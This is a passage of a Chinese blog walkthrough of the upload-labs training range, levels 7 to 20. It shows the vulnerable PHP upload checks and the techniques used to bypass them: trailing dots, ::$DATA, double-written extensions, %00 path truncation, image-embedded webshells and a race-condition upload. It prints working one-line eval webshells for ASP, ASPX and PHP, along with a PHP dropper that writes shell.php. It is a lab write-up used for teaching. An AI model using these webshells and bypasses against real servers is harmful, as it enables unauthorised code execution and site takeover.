t;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}查看源码，发现没有对点号进行限制，我们可以抓包在上传文件名后面加点号 第八关 123456789101112131415161718192021222324if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 发现没有对::$DATA进行过滤，可以利用windows的特性，上传抓包在文件名后面加::$DATA突破上传 第九关 1234567891011121314151617181920212223242526if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 查看源码 发现黑名单过滤了所以危险后缀，也有了过滤点号等操作 但是我们可以双写绕过 .空格.就可以绕过 第十关123456789101112131415161718if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}$file_name = str_ireplace($deny_ext,””, $file_name);这段代码的意思就是：将出现在黑名单的后缀名替换为空所以我们可以双写绕过 例如:phphpp 这样后台代码会把php替换为空，在把前面的ph，在把p拼接组成php 突破上传 第十一关 12345678910111213141516if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }} 这段代码是基于白名单的验证，发现只有jpg,png,gif才能上传 其他的后缀名无法上传抓个包：我们看见在上传包中 有上传的地址我们可以想到用%00截断上传在前提有两个条件: 1.PHP&lt;5.3.4 2.php的magic_quotes_gpc为OFF状态 先说说什么是%00截断上传: 谈到00截断我们都会想到，有什么0x00截断，%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置.知道了基本原理之后，我们还要分析它怎么起作用，如果按照上述的做法来做，则00绕过只能绕过前端验证，因为如果是后端验证，那么即使后缀被截断了，处理之后为.php，还是会被后端验证拦截，所以不是什么情况下00截断都有用的，不过这里至少可以确定，在绕过前端验证可以用。在文件名中插入空字符进行00截断，只适合前端绕过，后端绕过无效 如果在Burp中直接改filename，根本无法起作用，因为截断的只是后缀名，只能绕过简单的前端验证，到后端碰到上图的代码，在提取上传文件后缀的时候后缀还是.php，肯定会被拦，也就是说这里00截断没有发挥任何“绕过”后端验证的作用。 这里想绕过，必须要知道文件上传的条件： 1.后缀检测，合格则进行上传路径拼接2.拼接路径和文件名，组成文件上传路径 %u8FD9%u91CC%u51B3%u5B9A%u6587%u4EF6%u4E0A%u4F20%u540E%u88AB%u4FDD%u5B58%u5728%u6587%u4EF6%u5939%u4E2D%u7684%u771F%u5B9E%u540E%u7F00%u540D%u7684%u662F%u6587%u4EF6%u4E0A%u4F20%u8DEF%u5F84%uFF0C%u56E0%u4E3A%u4E0A%u9762%u4E00%u5927%u5806%u4EE3%u7801%u53EA%u4E0D%u8FC7%u662F%u5BF9%u540E%u7F00%u540D%u8FDB%u884C%u5404%u79CD%u5904%u7406%u548C%u9A8C%u8BC1%uFF0C%u8FD9%u91CC%u76F8%u5F53%u4E8E%u4E00%u4E2A%u8FC7%u5B89%u68C0%u7684%u8FC7%u7A0B%uFF0C%u6700%u540E%u51B3%u5B9A%u6587%u4EF6%u5230%u5E95%u662F%u4EC0%u4E48%u540D%u5B57%uFF0C%u4EC0%u4E48%u540E%u7F00%u540D%uFF0C%u8981%u770B**%u201C%u6587%u4EF6%u4E0A%u4F20%u8DEF%u5F84%u201D** 这个源码中的文件路径是上传路径和文件名拼接的，也就是说也许上面的后缀被处理了半天能通过安检了，但是最后上传后的文件后缀却不一定这个被处理了半天的“后缀”，不明白的可以去看看我的上一篇博客。这里拼接的是$file_name这个变量，它和后缀名变量$file_ext是不同的， $file_name没有经历那一堆安检处理，只是从它身上截取出了一个$file_ext变量拿去安检，因此这里用 $file_name来拼接路径的话，还是有可能蒙混过关的，比如这里就可以构造xxx.php.空格. 来进行绕过。 扯远了，回到00截断，说了这么多，也就是说想使用00截断绕过后端验证，除非两个条件之一：1.路径拼接像上图的代码一样，直接使用的 $file_name这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php。2.文件路径可控，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，因为不管它是啥，都会被截断而丢弃，因为这里已经到了“最后阶段”，不会再有安检过程了，这里截断之后的结果就是最终上传的结果，比如下图中，抓到的包里发现了路径，那么使用上面的方法直接改它，就可以成功上传aa.php文件，不管被处理后的文件名是什么，在这里被截断才是真正的“截断”，因为这是在安检（后缀名校验）之后进行的截断，直接决定真实的文件后缀名。【0x00h和%00】 %u5B83%u4EEC%u6700%u7EC8%u7684%u7ED3%u679C%u90FD%u662F%u4E00%u6837%u7684%uFF0C%u90FD%u4EE3%u8868%u7740chr%280%29%uFF0C%u5373%u7A7A%u5B57%u7B26%uFF0C%u53EA%u4E0D%u8FC7%u4F7F%u7528%u7684%u4F4D%u7F6E%u4E0D%u540C%uFF0C0x00%u4EE3%u886816%u8FDB%u5236%u7684%u7A7A%u5B57%u7B2600%uFF0C%u9700%u8981%u5728HEX%u4E2D%u6539%u4E3A00%uFF0C%u8FDB%u884C%u622A%u65AD%uFF0C%u800C%2500%u662FURL%u89E3%u7801%u4E4B%u524D%u7684%u5B57%u7B26%uFF0C%u5B83%u88AB%u89E3%u7801%u621016%u8FDB%u5236ASCII%u7801%u4E4B%u540E%u5B9E%u9645%u4E0A%u4E5F%u662F0x00%uFF0C%u6240%u4EE5%u5B83%u4EEC%u6700%u7EC8%u90FD%u5BF9%u5E94%u7684%u662F%u7A7A%u5B57%u7B26%uFF0C%u8FD9%u91CC%2500%u53EF%u4EE5%u7528%u5728URL%u4E2D%u5982xx.php%3Ffilename%3Dtest.php%2500.txt%uFF0C%u4E5F%u53EF%u4EE5%u76F4%u63A5%u63D2%u5728Burp%u5305%u4E2D%u7684%u8DEF%u5F84%u4E2D%uFF0C%u5982path%3Dshell.jsp%2500.txt 对于%00截断的利用必须满足是知道上传路径，然后上传路径进行截断 第十二关12345678910111213141516if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }}看源码这也是%00截断上传的题 只不过这是post提交抓个包：看见上传路径在post提交内容中 所以和前一关一样%00截断上传，但是不能直接用%00，因为这是在post表单中，url不会自动解码 所以我们要在hex里面改 第十三关12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }}?&gt;根据题目意思，让上传一个图片马到服务器中图片马的意思就是：一张完整图片中包含一句话木马 但是图片还是能正常显示图片马的制作：（1）copy 1.jpg/b+2.php/a shell.jpg (2)十六进制编辑器编辑添加用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存. 常见的一句话asp一句话 &lt;%eval request(“pass”)%&gt;aspx一句话 &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;php一句话 &lt;?php @eval($_POST[“pass”]);?&gt; 上传之后图片马一般是配合文件包含漏洞，也有少数网站能解析图片马中的php代码，这样的就可以直接用菜刀连接直接用菜刀连接图片马 虽然可以连接 但是会出错 用文件包含： 第十四关12345678910111213141516171819202122232425262728293031function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }}这也是图片马上传： getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过 第十五关1234567891011121314151617181920212223242526272829303132333435function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }}php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过 第十六关1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; }} 二次渲染是指上传文件服务器时，把图片中php代码删去但是可以经过对比来发现没有渲染的，在没有渲染的部分加入代码 第十七关1234567891011121314151617181920if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; }}可以上传图片马配合文件包含漏洞 来解析在一个可以使用竞争上传~竞争上传原理：网站逻辑：1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。在删除之前访问上传的php文件，从而执行上传文件中的php代码。我们可以写一个python脚本不断上传一句话，然后利用时间差就可以突破上传也可以使用bp！！！ 利用：在时间间隙中，不断访问一个恶意文件，这个文件中包含一段创建木马的代码，在不断访问之后就可以在服务创建这段木马程序python脚本：123import requestswhile True: requests.get(&quot;路径&quot;)上传的文件：12&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;');?&gt;路径就是上传文件的路径，比如：上传的文件名是webshell.php 路径是：upload构造完整路径就是：http://192.168.1.1/upload-labs/upload/webshell.php 第十八关1234567891011121314151617181920212223242526272829303132333435363738if (isset($_POST['submit'])){ require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; }} 因此我们可以通过条件竞争来上传图片马。 第十九关1234567891011121314151617181920212223242526272829if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); /* $file_name = trim($_POST['save_name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 */ $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} trick，move_uploaded_file会忽略掉文件末尾的/.。但是Pass9中的文件名是从$_FILES[‘upload_file’][‘tmp_name’]中获取的，这里是用户可控的。因此构造/.或者. 第二十关12345678910111213141516171819202122232425262728293031323334353637383940if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //mime check $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //check filename $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } } }else{ $msg = &quot;请选择要上传的文件！&quot;; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}","link":"/2019/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"}],"tags":[],"categories":[]}